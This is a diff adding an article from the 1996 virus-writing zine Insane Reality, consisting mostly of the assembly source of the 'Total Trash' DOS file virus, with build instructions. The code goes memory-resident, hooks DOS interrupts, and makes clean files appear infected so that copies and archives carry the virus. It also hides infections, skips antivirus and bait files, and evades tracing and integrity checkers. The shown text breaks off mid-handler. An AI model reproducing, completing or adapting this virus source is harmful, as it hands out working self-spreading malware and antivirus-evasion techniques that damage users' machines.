@@ -1,0 +1,1925 @@
+Insane Reality issue #8 - (c)opyright 1996 Immortal Riot/Genesis - REALITY.024
+
+Article: Total Trash
+Author: Sepultura [IRG]
+
+% Total Trash virus by Sepultura [IRG] %
+________________________________________
+
+The name of this virus says it all. It was coded hastily, in the same week
+that most of IR#8 was organised and the 'Preserving Infections' docs were
+done. This did not leave much time for bug testing. It seems to do its job.
+It does have some interesting ideas behind it though.
+
+Debug Script follows.
+
+- _Sepultura_
+
+;=[BEGIN TT.ASM]=============================================================
+
+;----------------------------------------------------------------------------
+comment %
+
+Total Trash virus 
+_________________
+
+Sepultura, Immortal Riot/Genesis, 1996.
+<sep@ikx.org>
+<sep@nether.net>
+
+To compile:	TASM /M9 TT
+		TLINK /T TT
+
+TT.COM contains the (runnable) virus.
+
+Like the Mirror virus by Bit Addict [TridenT] this virus uses the opposite
+of stealth techniques so uninfected file appear infected. This means that
+if you copy or archive a file, the source will remain clean but the newly
+created copy will be infected. You can PKZIP an uninfected file from a write
+protected floppy disk, and the copy of the file in the archive will be 
+infected. Unlike Mirror however, this virus is more intelligent in its
+behaviour. It only 'mirrors' an infection if DOS or a known archiver/backup/
+communications product is running. The rest of the time the virus is full
+stealth. 
+
+Look at the evolution of the stealth virus - people used to disinfect
+infected files when they were open to avoid detection. This didn't work with 
+write protected disks and slowed down the system with more disk access, so 
+they started using 'on-the-fly' stealth where reads were redirected and data
+altered in memory, so the physical file on disk was never altered. This virus
+extends that philosophy by using it for both stealth and infection.
+
+It also disables all activity if it detects disk diagnostics, and when DOS
+is running, reads are mirroed but DIR's are stealthed. This way the user
+doesn't notice increased file sizes, but the virus still travels via COPY.
+To make it more network compatible, SFT's arent used, hence we need to 
+keep track of handles ourselves.
+
+Advantages of this method:
+
+- Only infects out going objects (intelligent infection stratagy).
+- Less noticeable due to less disk access then most viruses.
+- Uses less resources (disk speed / disk space).
+- The virus NEVER writes to disk (except on AH=40h stealth) so behaviour
+  blockers can't catch it.
+- Works well against intergrity checkers.
+- Works correctly with PKZIP (Hi Chrons, didn't you realise disinfecting the 
+  file when it was closed would just slow things down and raise twice as
+  many alarms?)
+
+Disadvantages:
+
+- Infects quite slowly.
+- Doesn't work with networks.
+
+Things to do:
+
+- Bug fixing.
+- Mark infections externally (preferably with size padding, speed up DIR's).
+- Get it working with variable length infections.
+- Get it working with polymorphy (not just simple static add/sub/xor).
+- MBR infection to establish the virus on a machine.
+- Use SFT's - (less network compatible but easier, smaller, more stable).
+
+;----------------------------------------------------------------------------
+%		
+
+		.286
+		.model tiny
+		.code
+
+;----------------------------------------------------------------------------
+dwo		equ	dword ptr
+wo		equ	word ptr
+by		equ	byte ptr
+ofs		equ	offset
+
+hi		equ	2
+lo		equ	0
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+size		=	(ofs vend)
+msize		=	(ofs mend)
+mparas		=	(ofs mend - ofs main + 0Fh)/10h
+
+infected	=	01b
+infectable	=	10b
+
+size_stealth	=	0001b
+size_mirror	=	0010b
+file_stealth	=	0100b
+file_mirror	=	1000b
+
+_cf		=	0000000000000001b
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+zero		macro	zreg
+
+		xor	zreg,zreg
+	
+		endm
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+save		macro
+
+		pushf
+		pusha
+		push	es ds
+
+		endm
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+restore		macro
+
+		pop	ds es
+		popa
+		popf
+
+		endm
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+i21		macro	ax_val
+
+		IF ax_val
+			IF ax_val AND 0FF00h
+				mov	ax,ax_val + ('G' SHL 8)
+			 ELSE
+				mov	ah,ax_val + 'G'
+			ENDIF
+		ENDIF			
+
+                call	int_21
+
+		endm
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+mvs		macro	dest, src
+
+		push	src
+		pop	dest
+
+		endm
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+mcb		struc
+		
+		mcb_marker		db	?
+		mcb_owner		dw	?
+		mcb_size		dw	?
+		mcb_unused		db	3 dup (?)
+		mcb_name		db	8 dup (?)
+		
+		ends
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+saved_regs	struc
+
+		_ds	dw	?
+		_es	dw	?
+		_di	dw	?
+		_si	dw	?
+		_bp	dw	?
+		_sp	dw	?
+		_bx	dw	?
+		_dx	dw	?
+		_cx	dw	?
+		_ax	dw	?
+		_flags	dw	?
+		_ip	dw	?
+		_cs	dw	?
+		_ifs	dw	?
+
+		ends
+;----------------------------------------------------------------------------
+
+
+
+
+;----------------------------------------------------------------------------
+header_size	=	28
+
+exe_header	struc
+
+		exe_mz			dw	?
+		exe_mod_512		dw	?
+		exe_pages		dw	?
+		exe_reloc_items		dw	?
+		exe_header_paras	dw	?
+		exe_min_mem		dw	?
+		exe_max_mem		dw	?
+		exe_ss			dw	?
+		exe_sp			dw	?
+		exe_checksum		dw	?
+		exe_ip			dw	?
+		exe_cs			dw	?
+		exe_1st_reloc		dw	?
+		exe_overlay_no		dw	?
+
+exe_header	ends
+;----------------------------------------------------------------------------
+
+
+		.code
+		org	0
+
+;=[Loader Stubb]=============================================================
+
+main:		cld
+		push	ds
+
+		mov	ah,30h       		; Call Residency Check
+		mov	dx,'IR'
+		mov	cx,200h
+_512		=	wo [$-2]
+		int 	21h
+delta_offset	=	$
+
+		mov	bp,sp			; Get Delta Offset
+		mov	bp,wo ss:[bp-6]
+		sub	bp,ofs delta_offset
+
+		or	dx,dx
+		jnz	cont_install		; continue if not TSR'd
+
+		mov	si,bp			; make sure its the virus
+		zero	di			; intercepting the call.
+		mov	cx,id_length
+		segcs
+		repe	cmpsb
+		je	restore_host
+
+cont_install:	mov	ax,ds
+		dec	ax
+		mov	ds,ax
+		zero	di
+		cmp	by ds:[di],'Z'		; we're last MCB?
+		jne	restore_host
+
+		add	ax,wo ds:[di.mcb_size]	; AX = temp segment for virus
+		sub	ax,mparas
+		mov	es,ax
+		mov	si,bp
+		mov	cx,msize
+
+		segcs        			; copy virus to temp seg.
+		rep	movsb
+
+		mov	di,ofs handle_table	; clear handle tracking/status
+		zero	al
+		mov	cl,65
+		rep	stosb
+		
+		pop	ds
+		push	ds
+		mov	si,0Ah			; INT 22h in PSP.
+		mov	di,ofs vector
+		movsw
+		movsw
+		mov	wo ds:[si-4],ofs i22_handler
+		mov	wo ds:[si-2],es
+
+restore_host:	pop	ax
+		mov	bx,ax
+		add	ax,10h  		; get base segment
+_16		=	wo [$-2]
+		lea	si,[bp.clean_header]
+		add	wo cs:[si.exe_cs],ax	; calc. clean cs
+		add	wo cs:[si.exe_ss],ax	; calc. clean ss
+
+		mov	ds,bx			; set DS,ES
+		mov	es,bx
+
+		cli
+		mov	sp,wo cs:[si.exe_sp]	; set SS:SP
+		mov	ss,wo cs:[si.exe_ss]
+		sti
+		clc
+
+		jmp	dwo cs:[si.exe_ip]	; JMP to CS:IP
+
+;============================================================================
+
+
+db		" [Total Trash] by Sepultura. ",0
+
+
+;=[INT 22h Handler]==========================================================
+;
+; INT 22h is JMP'd to (not called) after program termination. This is when
+; we go resident. This has two advantages. Firstly, programs like SVS and
+; VSAFE which check if interrupts have been changed on AH=4Ch will not 
+; catch us, since no interrupts have changed yet (we set the INT 22h vector
+; in our hosts PSP). Secondly, out hosts memory has been free'd so we can
+; go resident in the MCB immediately following the last TSR, like we were
+; a legitimate program.
+
+i22_handler:	save
+
+		cld
+		zero	si
+		zero	di
+
+		mov	bx,mparas			; Allocate Virus MCB
+		mov	ah,48h
+		int	21h
+		jc	i22_abort
+
+		mov	es,ax
+		dec	ax
+		mov	ds,ax
+		mov	ds:wo [si.mcb_owner],0008h	; MCB Owner = DOS
+
+							; Copy Virus over
+		mov	cx,msize
+		segcs
+		rep	movsb
+
+		call	hook21				; Hook INT 21h
+
+i22_abort:	jmp	i21_exit
+				
+;============================================================================
+
+
+
+;=[Hook INT 21h]=============================================================
+;
+; if DOS is in the HMA we intercept its low hook. otherwise we just intercept
+; 0:84h.
+
+hook21:		push	es		; ES = new virus segment
+
+		mov	ax,3306h
+		int	21h
+
+		cmp	bl,-1		; DOS Version < 5?
+		je	h21_no_hma
+
+		test	dh,16		; DOS in HMA?
+		jz	h21_no_hma
+
+		call	search_low	; look for DOS low hook.
+		jnc	h21_got_vector
+
+h21_no_hma:	mvs	es,0		; NO?
+		mov	di,84h		; just use the IVT
+		
+h21_got_vector: mov	si,di		; DS:SI = vector to intercept.
+		mvs	ds,es
+		mov	di,ofs vector
+		pop	es
+
+		movsw			; save vector
+		movsw
+
+		mov	wo ds:[si-4],ofs i21_handler ; set vector
+		mov	wo ds:[si-2],es
+
+		ret
+
+;============================================================================
+
+
+		
+;=[Scan for DOS low kernal]==================================================
+;
+; search for the 3rd:	NOP- or JMP $+2
+;			NOP/
+;
+;			CALL	$+00xx
+;			JMP	far cs:[imm ptr xxxx]
+
+search_low:	mov 	ah,52h
+		int	21h
+		mov	di,0E00h
+		mov	cx,400h
+		mov	bp,3
+		mov	ax,9090h	     ; NOP,NOP
+
+sl_find_9090:	scasw
+		je	sl_found_9090	     ; NOP, NOP (DOS low kernal patch)
+
+		cmp	wo es:[di+2],00EBh   ; JMP $+2 (NVC Patch)
+		je	sl_found_9090
+
+		dec	di
+		loop	sl_find_9090
+
+		stc			; cant find hook, so exit with error
+		ret
+
+sl_found_9090:	cmp	byte ptr es:[di],0E8h	 ;NOP,NOP,CALL
+		jne	sl_find_9090
+		cmp	word ptr es:[di+2],2E00h ;NOP,NOP,CALL $+00xx,CS:
+		jne	sl_find_9090
+		cmp	word ptr es:[di+4],2EFFh ;2xNOP,CALL $+00xx,CS:JMP Far
+		jne	sl_find_9090
+		dec	bp			;The Third such Construct?
+		jnz	sl_find_9090
+
+		mov	di,es:[di+6]
+		
+		clc				; got it!
+		ret
+
+;============================================================================
+
+
+
+;=[Check filename is valid]==================================================
+;
+; assume DS:SI = filename
+;
+; returns:	CF = Bad File Name
+;		NC = Infectable File Name
+;
+; bad filenames include bait and anti-virus files.
+
+check_filename:	mvs	es,cs
+		mov	di,ofs name_buffer
+
+		i21	60h		; qualify filename
+		jc	cfn_abort	; bad file name?
+			
+		mov	cx,128
+		zero	al
+		repne	scasb
+
+; FILENAME.EXT,0,?
+; 321098765432 1 ^- DI
+; 1111
+			
+		cmp	wo es:[di-5],'E.'	; .EXE ?
+		jne	cfn_bad
+		cmp	wo es:[di-3],'EX'
+		jne	cfn_bad
+		
+		mov	cx,13
+		mov	al,'\'		; search for begining of name.
+
+		std
+		repne	scasb
+		inc	di		; DI = start of filename.
+		cld
+
+		cmp	by es:[di],'S'	; no S*.EXE's
+		je	cfn_bad
+		cmp	wo es:[di],'BT' ; TB*
+		je	cfn_bad
+
+cfn_loop:	mov	al,by es:[di]	
+		cmp	al,'.'
+		je	cfn_done
+		cmp	al,'V'		; no filenames containing 'V'
+		je	cfn_bad
+		cmp	al,'9'		; no filename containing numbers
+		ja	cfn_cont
+		cmp	al,'0'
+		jae	cfn_bad
+		cmp	al,'-'		; no filenames with a hyphen.
+		je	cfn_bad
+cfn_cont:	inc	di
+		jmp	cfn_loop
+
+cfn_done:	clc			; good filename
+cfn_abort:	ret
+
+cfn_bad:	stc			; bad filename
+		ret
+
+;============================================================================
+
+
+
+;=[INT 21h Dispatcher]=======================================================
+;
+; Checks if we are traced and aborts if so. Otherwise it just branches to the
+; appropriate sub-handler.
+
+i21_handler:	save
+		cld
+		mov	bp,sp
+
+		cli			; Check if Traced.
+		push	'IR'
+		pop	di
+		dec	sp
+		dec	sp
+		pop	cx
+		cmp	di,cx
+		je	$+5
+		jmp	return		; traced so abort
+
+		push	cs
+		pop	es
+		xchg	al,ah
+		mov	di,ofs i21_func_table	; find the function in our
+		mov	cx,no_of_funcs		; lookup table
+		repne	scasb
+
+		sub	di,ofs i21_func_table+1 ; get JMP table entry
+		add	di,di
+		jmp	wo cs:[di.i21_jmp_table]	; JMP to it
+
+;============================================================================
+
+
+
+;=[JMP Table]================================================================
+;
+; 11h - *  FCB size stealth/mirror
+; 12h - *  FCB size stealth/mirror
+; 30h - *  Residency Check
+; 32h - *  Disable all virus activity
+; 3Dh - *  Mode 01 -> mode 02, set handle entry, 
+; 3Eh - *  Clear handle entry, 
+; 3Fh - *  Read stealth/mirror
+; 40h - *  Disinfect if virus affected, *update handle entry*
+; 42h - *  Stealth/mirror seek from end (4202h)
+; 45h - *  Copy handle entry
+; 46h - *  Forced copy handle entry
+; 4Bh - *  Stealth on load (4B01h), set default behaviour (4B00h)
+; 4Ch - *  Set default behavior
+; 4Eh - *  DTA size stealth/mirror
+; 4Fh - *  DTA size stealth/mirror
+; 6Ch - *  Mode 01 -> mode 02, check opening stratagy, set handle entry,
+
+i21_func_table:	db	11h
+		db	12h
+		db	30h
+		db	32h
+		db	3Dh
+		db	3Eh
+		db	3Fh
+		db	40h
+		db	42h
+		db	45h
+		db	46h
+		db	4Bh
+		db	4Ch
+		db	4Eh
+		db	4Fh
+		db	6Ch
+		db	-1		; Default handler.
+
+no_of_funcs	=	($-ofs i21_func_table)
+
+i21_jmp_table:	dw	ofs i21_11
+		dw	ofs i21_12
+		dw	ofs i21_30
+		dw	ofs i21_32
+		dw	ofs i21_3D
+		dw	ofs i21_3E
+		dw	ofs i21_3F
+		dw	ofs i21_40
+		dw	ofs i21_42
+		dw	ofs i21_45
+		dw	ofs i21_46
+		dw	ofs i21_4B
+		dw	ofs i21_4C
+		dw	ofs i21_4E
+		dw	ofs i21_4F
+		dw	ofs i21_6C
+		dw	ofs i21_exit
+
+;============================================================================
+	 
+
+db		" Immortal Riot/Genesis - Punishing Your Machine in '96 ",0
+
+
+;=[Default Handler]==========================================================
+
+; default function (unmonitored functions)
+; just continue on into the INT 21h chain.
+
+i21_exit:	restore
+
+jmp_vector:	db	0EAh
+id_length	=	(ofs $)
+
+vector		dd	?
+
+;============================================================================
+
+
+
+;=[AH=11h - Find First FCB]==================================================
+;=[AH=12h - Find Next FCB]===================================================
+;
+; This is a little different from most 11h/12h size stealth handlers since
+; it has to open the file. This means we have to convert the FCB information
+; to a valid ASCIIZ file name. First we get the drive number from the FCB. If
+; its not the default drive (0) we convert the number to an ascii character
+; (1=A,2=B, etc) and place a '<drive>:' into out name buffer. We then copy
+; the first 8 characters of the namefield over (DOS ignores the spaces), add
+; a '.', copy over the extension then place a terminating 0. If the filename
+; seems to be a valid one we open it and check if its infected/infectable.
+; We then jump to Sizer which adjusts the size appropriately.
+
+i21_11:		
+i21_12:		call	set_status
+		test	by cs:[status],size_stealth+size_mirror
+		jz	i21_exit
+
+		call	chain_21
+		cld
+		or	al,al		; succesful?
+		jz	_11_success
+
+return:		restore
+		retf	2
+
+_11_success:	i21	2Fh
+		mvs	ds,es		; DS:BX = FCB
+		cmp	by ds:[bx],-1	; extended fcb?
+		jne	_11_ne
+		add	bx,7
+
+_11_ne:		cmp	wo ds:[bx+1Dh.hi],0	; skip bad sized files
+		jne	_11_ch
+		cmp	wo ds:[bx+1Dh.lo],10000
+		jb	return
+_11_ch:		cmp	wo ds:[bx+1Dh.hi],10h
+		ja	return
+
+		lea	si,[bx+1]	; ds:si=fcb name
+		mvs	es,cs
+		mov	di,ofs fn_buffer
+		push	di
+		mov	al,by ds:[bx]
+		or	al,al		; default drive?
+		jz	_11_dd
+
+		add	al,'A'-1
+		mov	ah,':'		; put <drive>:
+		stosw
+
+_11_dd:		movsw			; copy filename
+		movsw
+		movsw
+		movsw
+		mov	al,'.'		; put '.'
+		stosb
+		movsw			; copy extension
+		movsb
+		zero	al		; terminating NUL
+		stosb
+
+		mvs	ds,cs
+		pop	si		; DS:SI = fn_buffer
+		call	check_filename
+		jc	return
+		
+		mov	dx,ofs name_buffer
+		i21	3D00h
+		jc	return
+		xchg	bx,ax
+
+		call	get_handle_info
+		pushf
+		i21	3Eh
+		i21	2Fh		; ES:BX = DTA
+
+		cmp	by es:[bx],-1	; extended fcb?
+		jne	_11_ne2
+		add	bx,7
+_11_ne2:        add	bx,3
+		jmp	sizer
+
+;============================================================================
+
+
+
+;=[AH=30h - Installation Check]==============================================
+;
+; AH=30h, CX=200h, DX='IR' is the installation check. The virus also compares
+; about 600 bytes of the caller with itself, to make sure a program other
+; then the virus isn't issuing the call (like an AV checking if the virus is
+; resident). The TSR copy of the virus then returns DX=0, ES=TSR CS. The
+; copy of the virus that issued the call then uses the value in ES to 
+; do the same compare and make sure that a memory resident AV program isnt
+; faking the call to stop the virus from going resident. Is this overkill?
+
+i21_30:		cmp	dx,'IR'			; DX='IR'?
+		jne	i21_exit_30
+		cmp	wo ss:[bp._cx],200h	; CX=200h ?
+		jne	i21_exit_30
+
+		les	di,dwo ss:[bp._ip]
+		sub	di,ofs delta_offset
+		mov	cx,id_length
+		zero	si			; compare byte by byte
+		segcs				; caller with virus
+		repe
+		cmpsb
+		jne	i21_exit_30
+
+		mov	wo ss:[bp._dx],cx
+		mov	wo ss:[bp._es],cs
+
+i21_exit_30:	jmp	i21_exit
+
+;============================================================================
+
+
+
+;=[AH=32h - Get DBP]=========================================================
+;
+; A program has asked for a pointer to a Drive Paramenter Block, which is 
+; done by practically all disk diagnostic programs (NDD, CHKDSK, etc) while
+; this progam is running, ALL stealth and mirroring is disabled.
+
+i21_32:		mov	by cs:[status],0
+		jmp	i21_exit_30
+
+;============================================================================
+
+
+
+;=[AH=3Dh - Open File]=======================================================
+;
+; If the file is infectable mark it as such in the handle table.
+; If its infected mark it as infected, otherwise mark it as unused.
+;
+; If the file is opened as Write only, set it as Read/Write.
+
+i21_3D:		test	ah,1			; Write only?
+		jz	_3D_r
+		dec	by ss:[bp._ax.lo]
+		or	by ss:[bp._ax.lo],2 	; make it read/write
+
+_3D_r:		mov	si,dx
+_3D_6C:		call	check_filename		; infectable filename?
+		pushf
+		call	set_status
+		popf
+		jc	i21_exit_30		; exit if so
+
+		call	chain_21		; do the open
+		jc	_3D_exit
+
+		xchg	bx,ax
+		call	get_handle_info
+		mov	ah,0		; dont mirror or stealth file
+		jc	_3D_set		; uninfectable?
+		mov	ah,infected	; stealth, but dont mirror
+		je	_3D_set		; infected?
+		mov	ah,infectable	; mirror, but dont stealth
+
+_3D_set:	call	clr_handle_entry
+		shl	ah,cl
+		or	by cs:[di],ah	; set handle entry
+
+_3D_exit:	jmp	return
+
+;============================================================================
+
+
+
+;=[AH=3Eh - Close file]======================================================
+;
+; just clear the handles entry in out handle table
+
+i21_3E:		call	clr_handle_entry
+		call	set_status
+_i21_exit_a:	jmp	i21_exit
+
+;============================================================================
+
+
+
+;=[AH=3Fh - Read]============================================================
+;
+; This branches to either the read mirror or read stealth procedure.
+; If we are in file mirror mode and the file is infectable the mirror 
+; procedure is invoked. If we are in mirror stealth mode and the file is
+; infected then the stealth procedure is invoked. Else we just let DOS do
+; the read normally.
+
+i21_3F:		mvs	ds,cs
+
+		call	get_file_ptr          	; save file ptr	
+		mov	wo ds:[orig_ptr.hi],dx
+		mov	wo ds:[orig_ptr.lo],ax
+		and	wo ss:[bp._flags],NOT _cf       ; no error so far
+
+		call	get_handle_entry
+		mov	ch,by ds:[di]
+		shr	ch,cl
+
+		test	by ds:[status],file_stealth
+		jz	_3F_cm
+
+		call	get_handle_info		
+		jnz	_i21_exit_a		; not infected?
+		jmp	_3F_stealth		
+		
+_3F_cm:		test	by ds:[status],file_mirror
+		jz	_i21_exit_a
+		test	ch,infectable
+		jz	_i21_exit_a
+
+		call	get_handle_info
+
+		zero	di
+
+;----------------------------------------------------------------------------
+; BASIC READ MIRROR ALGORITHM
+;
+; (This is used when a file we want to be infected, but isnt really infected
+; is read. It makes it appear that the file IS infected. by making the files
+; header contain the information it would have if it was infected, and by
+; making it possible to read outside the real physical file, so that it
+; appears the virus had been appended (virtual virus image).)
+;
+; If the read starts after the virtual virus image we return no error, and
+; AX=0 (0 bytes read i.e. EOF) and EXIT.
+;
+; If the read ends after the virtual virus image we reduce the amount of 
+; bytes to be read so it ends at the end of the virtual virus image and
+; CONTINUE.
+;
+; If the read then starts in the virtal virus image we just copy over the
+; approporiate number of bytes from the appropriate offset of the virus to
+; the start of the read buffer. We set AX to the number of the bytes 'read'
+; and we update the file ptr. We then EXIT.
+;
+; We do the read.
+;
+; If EOF was reached (bytes to be read > bytes read) we then copy the 
+; appropriate number of bytes from the start of the virus to the end of the
+; read buffer. We update the file ptr and CONTINUE.
+;
+; If the read started in the header we the overwrite the appropriate number
+; of bytes at the start of the read buffer with the appropriate information
+; from the infected header.
+;
+; DONE. Not to hard, huh?
+							; READ MIRROR START
+		mov	si,ofs infected_size
+		call	cmpd			; read starts after virus?
+		jb	_3fm_cin_virus
+
+_3fm_vread_done:mov	wo ss:[bp._ax],di		; 0 bytes read
+		
+_3fm_error:	jmp	return
+
+_3fm_cin_virus:	mov	si,ofs clean_size
+		call	cmpd			; read starts in virus?
+		jb	_3fm_do_read
+
+		push	ax
+		neg	ax		; AX = End of Virus - File PTR
+		add	ax,wo ds:[infected_size.lo] ;(amount of bytes to copy)
+		mov	cx,size
+		cmp	cx,ax
+		jb	_3fm2
+		mov	cx,ax
+
+_3fm2:		pop	si
+		sub	si,wo ds:[clean_size.lo]	
+		push	wo ds:[orig_ptr.lo]
+		push	wo ds:[orig_ptr.hi]	; go look at _3fm_vcopy to
+		zero	ax			; understand this.
+		mov	wo ss:[bp._ax],ax
+		jmp	_3fm_vcopy
+
+_3fm_do_read:	call	chain_21		; do the actual read
+		cld
+		mov	bp,sp
+		jc	_3fm_abort
+
+		mvs	ds,cs
+		cmp	ax,cx			; read succesful?
+		je	_3fm_check_hdr
+
+		call	get_file_ptr
+		mov	si,ofs clean_size
+		call	cmpd			; EOF reached?
+		jne	_3fm_check_hdr
+
+		push	ax dx			; DAX
+
+		sub	cx,ax			; CX=bytes of the virus to
+		cmp	cx,size			; copy.
+		jb	_3fm1
+		mov	cx,size
+
+_3fm1:		zero	si
+_3fm_vcopy:	mov	es,wo ss:[bp._ds]	; file ptr on stack,
+		mov	di,wo ss:[bp._dx]	; cx=bytes to copy, 
+		add	wo ss:[bp._ax],cx	; ax=ofs in buffer, si=virus
+		push	cx
+		add	di,ax			; ES:DI = dest. of virus
+		rep	movsb			; copy virus
+
+		pop	ax cx dx		; CX:DX=file ptr, AX=bytes
+		add	dx,ax			; copied.
+		adc	cx,0
+		i21	4200h			; fix file ptr
+
+_3fm_check_hdr:	mov	bx,ofs infected_header
+_3f_do_header:	mov	si,wo ds:[orig_ptr.lo]
+		cmp	wo ds:[orig_ptr.hi],0	; read in header?
+		jne	_3fm_abort
+		cmp	si,header_size
+		jnb	_3fm_abort
+
+		mov	di,wo ss:[bp._dx]	; ES:DI = infected header in
+		mov	es,wo ss:[bp._ds]	; read buffer
+
+		mov	cx,wo ss:[bp._ax]	; CX = bytes read
+
+		mov	dx,header_size
+		sub	dx,si			; DX = bytes left in header
+
+		cmp	cx,dx			; bytes read < bytes " " " ?
+		jb	_3fm_copy_hdr
+		mov	cx,dx
+
+_3fm_copy_hdr:	add	si,bx		; copy over infected header
+		rep	movsb
+
+_3fm_abort:	jmp	return
+
+;----------------------------------------------------------------------------
+; BASIC READ STEALTH ALGORITHM
+;
+; (This is just the usual read stealth and doesnt need much explanation. 
+; There are several ways of doing it but i just did it in the way i see as
+; being most logical. Since i havent seen anyone explain their stealth in
+; their source I'll explain it now.)
+;
+; We are trying to hide the virus. The only differences between the clean 
+; and infected files are the different headers and that the infected file has
+; the virus appended at the end, so we take the following steps.
+;
+; If the read starts in the virus, set no error, 0 bytes read (fake an EOF)
+; and EXIT.
+;
+; If the read ends in the virus, just reduce the bytes to be read (CX) so
+; it ends at the end of the clean file and CONTINUE.
+;
+; Do the read and restore CX to its original calling value.
+;
+; If the read started in the header, overwrite the appropriate number of 
+; bytes at the start of the read buffer with the clean header.
+;
+; DONE. This is WAYYYY easier then the read mirror algorithm.
+
+_3f_stealth:	zero	di
+
+		mov	si,ofs clean_size	; read starts in virus?
+		call	cmpd
+		jb	_3fs_checkend
+
+		mov	wo ss:[bp._ax],di		; 0 bytes read
+_3fs_error:	jmp	return
+
+_3fs_checkend:	mov	cx,wo ss:[bp._cx]	; check if read enters virus
+		mov	wo cs:[read_cx],cx
+
+		add	ax,cx 			; DX:AX = predicted end 
+		adc	dx,di			; of read
+
+		call	cmpd			; SI = clean_size
+		jb	_3fs_doread		; read ends in virus?
+
+		mov	ax,wo ds:[clean_size.lo]
+		sub	ax,wo ds:[orig_ptr.lo]	; CX = bytes to read
+		mov	wo ss:[bp._cx],ax
+
+_3fs_doread:	call	chain_21 		; do the read
+		mov	bp,sp
+		push	wo cs:[read_cx]		; restore return CX
+		pop	wo ss:[bp._cx]
+		cld
+		jc	_3fm_abort		; abort - error
+		
+		mvs	ds,cs
+		mov	bx,ofs clean_header
+		jmp	_3f_do_header		; check the header
+		
+;============================================================================
+
+
+
+;=[AH=40h - Write]===========================================================
+;
+; If the file is infected, we check if the virus is affected by the write.
+; The virus is affected if:
+;
+; - 0 bytes are written - this will change the length of the file.
+; - The write starts in the header - ofcos we cant have the header destroyed.
+; - The write ends after the clean file - this virus will be overwritten 
+;   and/or the file length will change.
+;
+; If the virus is affected we disinfect the file. This is the ONLY time the
+; virus ever writes to a file.
+
+i21_40:		call	get_handle_entry
+		mov	al,cs:[di]
+		shr	al,cl
+		test	al,infected
+		jz	_i21_exit_c
+
+		call	get_handle_info
+		jnz	_i21_exit_c		; not infected?
+
+		call	get_file_ptr		; DX:AX = file ptr
+		mov	cx,wo ss:[bp._cx]	; CX = bytes to write
+
+		jcxz	_40_do_it		; 0 bytes written causes
+						; a change in file length
+		or	dx,dx
+		jnz	_40_end
+
+		cmp	ax,header_size		; writing to header
+		jb	_40_do_it
+
+_40_end:	add	ax,cx
+		adc	dx,0		; DX:AX = file ptr _after_ write
+
+		mov	si,ofs clean_size
+		call	cmpd		; writes past clean EOF?
+		jb	_i21_exit_c
+
+_40_do_it:	sub	ax,cx
+		sbb	dx,0
+		push	dx ax		; write could corrupt virus - 
+					; - disinfect.
+		mvs	ds,cs
+		les	dx,dwo ds:[clean_size]
+		mov	cx,es		; CX:DX
+		i21	4200h		; seek to clean EOF
+
+		zero	cx
+		i21	40h		; truncate it to clean length
+
+		call	seek_to_start
+		mov	dx,ofs clean_header
+		mov	cx,header_size
+		i21	40h		; write clean header
+
+		pop	dx cx
+		i21	4200h   	; restore file ptr
+
+		call	clr_handle_entry	; update handle table
+
+_i21_exit_c:	jmp	i21_exit
+
+;============================================================================
+
+		  
+
+;=[AH=42h - LSeek]===========================================================
+;
+; This handles the case where a request is made to seek relative to the EOF.
+; It is nescessary to handle this, since many programs use such a request to
+; determine the length of a file. The relative offset of the seeks is held in
+; CX:DX (CDX). 
+;
+; If we are in file stealth mode and the file is infected, we subtract the
+; virus size from CDX then continue with the call as usual.
+;
+; If we are in file mirror mode and the file is infectable, we add the virus
+; size to CDX then continue with the call as usual.
+
+
+i21_42:		cmp	ah,02			; seek from end?
+		jne	_i21_exit_c
+
+		call	get_handle_entry
+
+		mov	al,infected		; setup for lseek stealth
+
+		test	by cs:[status],file_stealth
+		jz	_42_mirror
+
+		shl	al,cl
+		test	by cs:[di],al		; file suitable?
+		jz	_i21_exit_42
+
+		sub	wo ss:[bp._dx],size
+		sbb	wo ss:[bp._cx],0		
+		jmp	_i21_exit_42
+
+;----------------------------------------------------------------------------
+
+_42_mirror:	mov	al,infectable		; setup for lseek mirror
+		test	by cs:[status],file_mirror
+		jz	_i21_exit_c
+
+		shl	al,cl
+		test	by cs:[di],al		; file suitable?
+		jz	_i21_exit_42
+
+		add	wo ss:[bp._dx],size
+		adc	wo ss:[bp._cx],0		
+_i21_exit_42:	jmp	_i21_exit_c
+
+;============================================================================
+
+
+
+;=[AH=45h - Duplicate file handle]===========================================
+;
+; The program is copying a file handle entry to another handle, so we do the
+; call the copy the source handles entry in our handle table to the entry of
+; the destination handle.
+
+i21_45:		call	chain_21
+		jc	_45_exit
+
+_45_46:		push	ax
+		call	get_handle_entry
+		call	set_status
+		mov	dl,by cs:[di]
+		shr	dl,cl
+		and	dl,011b		; get source handles status
+		pop	bx
+		
+		call	clr_handle_entry	; clear target handle status
+		shl	dl,cl			; and set it to source
+		or	by cs:[di],dl
+_45_exit:	jmp	_3D_exit
+
+;============================================================================
+
+
+
+;=[AH=46h - Force Duplicate file handle]=====================================
+;
+; This is very similar to 45h except the destination handle number is given
+; in CX.
+
+i21_46:		call	chain_21
+		xchg	cx,ax
+		jmp	_45_46
+
+;============================================================================
+
+
+
+;=[AH=4Bh - Load/Load and Execute]===========================================
+;
+; If its 4B00h (load and execute) we just restore the behaviour status to the
+; default setting.
+;
+; If its 4B01h (load) the file is probably being debugged, so if its infected
+; we alter the CS:IP and SS:SP returned in the parameter block so the file
+; appears clean.
+
+i21_4B:		mov	cs:wo [_4B_bx],bx
+
+		cmp	ah,01		
+		ja	_i21_exit_b	; Unwanted?
+		jb	i21_4C		; Load and Execute?
+
+;----------------------------------------------------------------------------
+; 4B01h - load, so we fix the parameter block and stack to look clean.
+		
+		i21	3D00h
+		jc	_i21_exit_b
+		xchg	bx,ax
+		call	get_handle_info	; check for infection 
+		pushf
+		i21	3Eh
+		popf
+		jnz	_i21_exit_b
+
+		call	chain_21	; do the load
+		jc	_4B01_abort
+
+		mov	si,?
+_4B_bx		=	$-2
+		mvs	ds,es		; DS:SI = parameter block
+
+		les	di,dwo ds:[si+0Eh]
+		push	wo es:[di]		; push callers AX
+
+		mov	di,ofs clean_header
+
